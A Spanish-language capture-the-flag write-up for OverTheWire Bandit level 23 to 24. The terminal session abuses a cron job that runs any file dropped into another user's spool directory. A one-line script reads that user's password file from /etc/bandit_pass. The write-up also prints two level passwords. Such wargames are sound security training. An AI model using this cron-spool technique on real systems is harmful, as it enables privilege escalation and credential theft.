# Level 23 al 24

## Objetivo.

## Datos de acceso al nivel.

bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solución.

bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$  mkdir /tmp/kd
mkdir: cannot create directory ‘/tmp/kd’: File exists
bandit23@bandit:~$  cd /tmp/kd
bandit23@bandit:/tmp/kd$ echo "cat /etc/bandit_pass/bandit24 > /tmp/kd/password" > script.sh
bandit23@bandit:/tmp/kd$ chmod +x script.sh
bandit23@bandit:/tmp/kd$ touch password
bandit23@bandit:/tmp/kd$ chmod 666 password
bandit23@bandit:/tmp/kd$  ls –la
ls: cannot access '–la': No such file or directory
bandit23@bandit:/tmp/kd$ ls -la
total 128
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 24 23:01 .
drwxrwx-wt 3167 root     root     114688 Feb 28 22:02 ..
-rw-rw-rw-    1 bandit23 bandit23     33 Feb 28 22:02 password
-rwxrwxr-x    1 bandit23 bandit23     49 Feb 28 22:01 script.sh
bandit23@bandit:/tmp/kd$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kd$ ls -la
total 128
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 24 23:01 .
drwxrwx-wt 3167 root     root     114688 Feb 28 22:03 ..
-rw-rw-rw-    1 bandit23 bandit23     33 Feb 28 22:03 password
-rwxrwxr-x    1 bandit23 bandit23     49 Feb 28 22:01 script.sh
bandit23@bandit:/tmp/kd$ date
Tue Feb 28 10:03:19 PM UTC 2023
bandit23@bandit:/tmp/kd$ ls -la
total 128
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 24 23:01 .
drwxrwx-wt 3167 root     root     114688 Feb 28 22:03 ..
-rw-rw-rw-    1 bandit23 bandit23     33 Feb 28 22:03 password
-rwxrwxr-x    1 bandit23 bandit23     49 Feb 28 22:01 script.sh
bandit23@bandit:/tmp/kd$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Notas opcionales.

Su solución es similar al nivel anterior.

## Referencias.

https://overthewire.org/wargames/bandit/bandit24.html
https://mayadevbe.me/posts/overthewire/bandit/level24/